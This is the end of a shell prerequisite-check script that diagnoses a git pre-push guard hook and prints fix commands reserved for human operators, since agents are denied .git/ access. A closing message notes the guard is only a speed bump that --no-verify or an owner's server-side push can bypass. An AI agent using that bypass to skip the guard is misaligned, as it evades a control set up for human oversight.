      echo "  control-plane, so an agent seat is denied it):" >&2
      # THE LINK, NOT THE TARGET. `$GUARD_HOOK` has already been resolved PHYSICALLY (guard_resolve_deep
      # ends in `pwd -P`), so its dirname is where the link POINTS — `ls -ld` on that shows a plain
      # directory and teaches the operator nothing. The link itself lives at <git common dir>/hooks, so
      # that is what is derived here. RULE 2 applies: `--git-common-dir` is a DIFFERENT derivation from
      # the one check_guard_installed already vetted, and vetting only the path that had already been
      # fixed is the partial-application pattern this fix-loop exists to close (the same reasoning as
      # `_g_src` above).
      _g_hdir=$(git rev-parse --git-common-dir 2>/dev/null) || _g_hdir=""
      [ -z "$_g_hdir" ] || _g_hdir=$(guard_resolve_deep "$_g_hdir") || _g_hdir=""
      if [ -n "$_g_hdir" ] && ! guard_path_hostile "$_g_hdir"; then
        printf '%s\n' "    ls -ld $(guard_shq "${_g_hdir%/}/hooks")" >&2
      else
        echo "    ls -ld <this repository's .git/hooks>    # its path cannot be printed safely here" >&2
      fi
      echo "  If the redirection is not deliberate, remove it so .git/hooks is a real directory inside" >&2
      echo "  this repository, then re-run this check to get the install command." >&2 ;;
    dangling)
      echo "  The hook path is a SYMLINK whose target does not exist. git runs nothing, so this tree is as" >&2
      echo "  unguarded as an empty one — and re-installing is the WRONG fix: a 'cp' would write THROUGH" >&2
      echo "  the link to whatever it points at, and chmod +x that, outside this repository." >&2
      echo "" >&2
      echo "  Fix (a HUMAN must run this — .git/ is control-plane, so an agent seat is denied):" >&2
      printf '%s\n' "    rm $(guard_shq "$GUARD_HOOK")    # remove the link, then re-run to get the install command" >&2 ;;
    inert)
      echo "  The hook is present and carries the kit's marker, but it is NOT EXECUTABLE — git silently" >&2
      echo "  ignores it, so nothing runs on push. Re-installing is not the fix; the permission bit is." >&2
      echo "" >&2
      echo "  Fix (a HUMAN must run this — .git/ is control-plane, so an agent seat is denied):" >&2
      printf '%s\n' "    chmod +x $(guard_shq "$GUARD_HOOK")" >&2 ;;
    unreadable)
      echo "  The hook is present but cannot be READ, so nothing here can even check it for the kit's" >&2
      echo "  marker. It is refused rather than assumed foreign: an unchecked hook waved through is a" >&2
      echo "  silent hole." >&2
      echo "" >&2
      echo "  Fix (a HUMAN must run this — .git/ is control-plane, so an agent seat is denied):" >&2
      printf '%s\n' "    chmod +r $(guard_shq "$GUARD_HOOK")    # then re-run; a genuine foreign hook is left alone" >&2 ;;
    *)
      # Unreachable from today's three armed states, and deliberately generic rather than a guess: a
      # future state that armed the refusal without teaching this block would otherwise be handed the
      # WRONG fix line, confidently. Naming the state is the honest answer to "I do not know the fix".
      printf '%s\n' "  Guard state: ${GUARD_STATE:-unknown} — inspect the hook above; it is not in force." >&2 ;;
  esac
  echo "" >&2
  echo "  THE CEILING, stated so a fixed guard is not read as more than it is: this hook is a SPEED BUMP," >&2
  echo "  not a boundary (docs/enterprise/platform-safety-boundary.md). Installing it does NOT make main" >&2
  echo "  safe. With solo enforce_admins:false the repository owner can still advance main from ANY clone" >&2
  echo "  — the bypass is server-side, where no local hook can see it — and --no-verify skips the hook" >&2
  echo "  outright. The boundary is platform-owned; see docs/operations/review-lane.md." >&2
  exit 1
fi

if [ "$miss" -ne 0 ]; then
  if [ "$RUNENV_FAILED" -eq 1 ]; then printf '%s\n' "A run-env FAIL above is not a missing tool: follow its Fix line."; fi   # SWAS-934
  echo "Missing prerequisites above — install them, then re-run."
  operator_card_pointer   # SWAS-775: the card follows the missing-prerequisite exit too
  exit 1
fi

# SWAS-355: an opt-out from the agent boundary with no matching entry in .kit/boundary-optout.conf (or a malformed declaration) fails the run.
# --boundary-advisory keeps the line and drops the exit, for a caller whose rc means something else.
if [ "$bfail" -ne 0 ] && [ "$BOUNDARY_ADVISORY" -eq 0 ]; then   # MUT-ADVISORY
  boundary_summary   # SWAS-474: the strict step first when egress is the gap; the old sentence otherwise (or after it, when a non-egress part failed as well)
  operator_card_pointer   # SWAS-775: the line after the summary, so after the egress block
  exit 1
fi

# A SUPPRESSED REFUSAL MUST NEVER READ AS A PASS: the escape proceeds (exit 0 — the operator asked for
# it), but it does NOT get the clean green. Anyone reading this output, or pasting it into a field-test
# report, sees an unsupported run for what it is.
if [ "$RUNTIME_WAIVED" -eq 1 ]; then
  # Rule 3 (finding L-3, the class): same three variables as the ERROR block above, same mechanism.
  printf '%s\n' "Prerequisites present, but this is an UNSUPPORTED runtime: node $RUNTIME_FOUND < the required"
  printf '%s\n' "Node $RUNTIME_FLOOR floor ($RUNTIME_SRC). Proceeding only because --allow-runtime-mismatch was passed."
  echo "This is NOT a supported configuration — failures beyond this point are expected, not defects."
  exit 0
fi

if [ "$PROJECT_CLASS" = kit ]; then echo "Prerequisites checked on the kit checkout, not a project: this is not an all-clear."; exit 0; fi   # MUT-PRKITLAST
echo "All prerequisites present."
exit 0
